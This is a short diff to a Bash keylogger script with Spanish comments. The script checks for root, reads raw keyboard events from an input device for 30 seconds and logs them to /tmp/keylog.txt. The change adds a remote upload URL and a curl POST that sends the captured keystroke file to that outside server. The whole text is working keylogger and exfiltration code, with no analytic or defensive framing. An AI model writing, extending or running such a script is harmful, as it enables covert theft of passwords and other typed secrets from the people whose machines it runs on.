@@ -2,6 +2,7 @@
 
 LOG_FILE="/tmp/keylog.txt"
 DEVICE="/dev/input/event3"  # Reemplázalo con el ID correcto
+SERVER_URL="http://server-prueba.com/upload"
 
 # Verifica que el script se ejecute como root
 if [[ $EUID -ne 0 ]]; then
@@ -19,4 +20,9 @@ PID=$!
 sleep 30
 kill $PID
 
-echo "[*] Captura finalizada. Archivo guardado en $LOG_FILE"
+echo "[*] Captura finalizada. Enviando archivo al servidor..."
+
+# Enviar el archivo al servidor remoto
+curl -X POST -F "file=@$LOG_FILE" "$SERVER_URL"
+
+echo "[*] Archivo enviado correctamente a $SERVER_URL"
